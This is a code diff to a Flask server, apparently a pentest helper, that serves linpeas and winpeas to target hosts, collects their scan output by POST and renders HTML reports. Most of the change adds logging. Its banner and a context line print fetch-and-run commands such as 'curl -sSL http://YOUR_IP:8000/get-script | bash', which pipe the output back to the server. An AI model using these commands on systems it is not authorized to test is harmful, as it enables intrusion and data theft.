@@ -5,6 +5,7 @@ Receives linpeas/winpeas output and generates interactive HTML reports
 """
 
 import os
+import sys
 import hashlib
 import time
 import requests
@@ -33,41 +34,47 @@ LINPEAS_URL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/lin
 WINPEAS_URL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"
 
 
+def log(msg):
+    """Print with immediate flush"""
+    print(msg)
+    sys.stdout.flush()
+
+
 def download_peass_scripts():
     """Download linpeas and winpeas scripts on startup if not present"""
     linpeas_path = os.path.join(SCRIPTS_DIR, "linpeas.sh")
     winpeas_path = os.path.join(SCRIPTS_DIR, "winpeas.exe")
     
-    print("[*] Checking for PEASS scripts...")
+    log("[*] Checking for PEASS scripts...")
     
     # Download linpeas if not present
     if not os.path.exists(linpeas_path):
-        print("[*] Downloading linpeas.sh...")
+        log("[*] Downloading linpeas.sh...")
         try:
             response = requests.get(LINPEAS_URL, timeout=30)
             with open(linpeas_path, 'wb') as f:
                 f.write(response.content)
             os.chmod(linpeas_path, 0o755)
-            print(f"[+] Downloaded linpeas.sh ({len(response.content) / 1024:.2f} KB)")
+            log(f"[+] Downloaded linpeas.sh ({len(response.content) / 1024:.2f} KB)")
         except Exception as e:
-            print(f"[!] Failed to download linpeas: {e}")
+            log(f"[!] Failed to download linpeas: {e}")
     else:
-        print("[+] linpeas.sh already present")
+        log("[+] linpeas.sh already present")
     
     # Download winpeas if not present
     if not os.path.exists(winpeas_path):
-        print("[*] Downloading winpeas.exe...")
+        log("[*] Downloading winpeas.exe...")
         try:
             response = requests.get(WINPEAS_URL, timeout=30)
             with open(winpeas_path, 'wb') as f:
                 f.write(response.content)
-            print(f"[+] Downloaded winpeas.exe ({len(response.content) / 1024:.2f} KB)")
+            log(f"[+] Downloaded winpeas.exe ({len(response.content) / 1024:.2f} KB)")
         except Exception as e:
-            print(f"[!] Failed to download winpeas: {e}")
+            log(f"[!] Failed to download winpeas: {e}")
     else:
-        print("[+] winpeas.exe already present")
+        log("[+] winpeas.exe already present")
     
-    print("")
+    log("")
 
 
 @app.route('/')
@@ -115,6 +122,7 @@ curl http://{request.host}/get-linpeas | bash | curl -X POST --data-binary @- -H
 @app.route('/get-script')
 def get_script():
     """Serve the wrapper script to target machine"""
+    log(f"[→] Serving wrapper script to {request.remote_addr}")
     with open('wrapper.sh', 'r') as f:
         script = f.read()
     # Replace placeholder with actual server URL
@@ -125,6 +133,7 @@ def get_script():
 @app.route('/get-linpeas')
 def get_linpeas():
     """Serve linpeas.sh to target machine"""
+    log(f"[→] Serving linpeas.sh to {request.remote_addr}")
     linpeas_path = os.path.join(SCRIPTS_DIR, "linpeas.sh")
     if not os.path.exists(linpeas_path):
         return "Error: linpeas.sh not found. Run setup.sh first.", 404
@@ -134,6 +143,7 @@ def get_linpeas():
 @app.route('/get-winpeas')
 def get_winpeas():
     """Serve winpeas.exe to target machine"""
+    log(f"[→] Serving winpeas.exe to {request.remote_addr}")
     winpeas_path = os.path.join(SCRIPTS_DIR, "winpeas.exe")
     if not os.path.exists(winpeas_path):
         return "Error: winpeas.exe not found. Run setup.sh first.", 404
@@ -149,57 +159,75 @@ def upload():
         hostname = request.headers.get('X-Hostname', 'unknown')
         scan_type = request.headers.get('X-Scan-Type', 'linpeas')
         
+        log("")
+        log("="*60)
+        log(f"[←] POST REQUEST RECEIVED from {request.remote_addr}")
+        log(f"[*] Session ID: {session_id}")
+        log(f"[*] Hostname: {hostname}")
+        log(f"[*] Scan Type: {scan_type}")
+        log(f"[*] Reading data...")
+        
         # Get the data
         data = request.get_data()
         
         if len(data) == 0:
+            log("[!] ERROR: No data received!")
             return jsonify({'error': 'No data received'}), 400
         
+        file_size = len(data)
+        log(f"[+] Received {file_size / 1024:.2f} KB of data")
+        
         # Calculate checksum
+        log(f"[*] Calculating checksum...")
         checksum = hashlib.md5(data).hexdigest()
+        log(f"[+] Checksum: {checksum}")
         
         # Save raw output
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
         filename = f"{scan_type}_{hostname}_{timestamp}.txt"
         filepath = os.path.join(OUTPUT_DIR, filename)
         
+        log(f"[*] Saving to: {filepath}")
         with open(filepath, 'wb') as f:
             f.write(data)
-        
-        file_size = len(data)
-        
-        print(f"[+] Received {scan_type} output from {hostname}")
-        print(f"[+] Size: {file_size / 1024:.2f} KB")
-        print(f"[+] Checksum: {checksum}")
-        print(f"[+] Saved to: {filepath}")
+        log(f"[+] File saved successfully")
         
         # Parse and generate HTML report
-        print(f"[+] Generating HTML report...")
+        log(f"[*] Generating HTML report...")
         from parser import generate_html_report
         report_path = generate_html_report(filepath, hostname, scan_type)
         
         report_url = f"http://{request.host}/reports/{os.path.basename(report_path)}"
-        print(f"[+] Report generated: {report_path}")
-        print(f"[+] View at: {report_url}")
-        print(f"[+] " + "="*50)
+        log(f"[+] Report generated: {os.path.basename(report_path)}")
+        log(f"[+] View at: {report_url}")
         
-        return jsonify({
+        # Prepare response
+        response_data = {
             'status': 'success',
             'session_id': session_id,
             'filename': filename,
             'size': file_size,
             'checksum': checksum,
             'report_url': f"/reports/{os.path.basename(report_path)}"
-        }), 200
+        }
+        
+        log(f"[*] Sending response to client...")
+        log("="*60)
+        log("")
+        
+        return jsonify(response_data), 200
         
     except Exception as e:
-        print(f"[!] Error: {str(e)}")
+        log(f"[!] ERROR in upload handler: {str(e)}")
+        import traceback
+        traceback.print_exc()
         return jsonify({'error': str(e)}), 500
 
 
 @app.route('/reports/<filename>')
 def serve_report(filename):
     """Serve generated HTML reports"""
+    log(f"[→] Serving report: {filename}")
     return send_from_directory(REPORTS_DIR, filename)
 
 
@@ -216,16 +244,17 @@ if __name__ == '__main__':
     ║   Automated linpeas/winpeas Parser    ║
     ╚═══════════════════════════════════════╝
     """)
-    print(f"[+] Output directory: {OUTPUT_DIR}")
-    print(f"[+] Reports directory: {REPORTS_DIR}")
-    print(f"[+] Scripts directory: {SCRIPTS_DIR}")
-    print("")
+    log(f"[+] Output directory: {OUTPUT_DIR}")
+    log(f"[+] Reports directory: {REPORTS_DIR}")
+    log(f"[+] Scripts directory: {SCRIPTS_DIR}")
+    log("")
     
     # Download PEASS scripts if needed
     download_peass_scripts()
     
-    print(f"[+] Starting server...\n")
-    print(f"[+] Target usage: curl -sSL http://YOUR_IP:8000/get-script | bash\n")
+    log(f"[+] Starting server...\n")
+    log(f"[+] Target usage: curl -sSL http://YOUR_IP:8000/get-script | bash\n")
+    log(f"[*] Waiting for connections...\n")
     
     # Run on all interfaces, port 8000
     app.run(host='0.0.0.0', port=8000, debug=False, threaded=True)
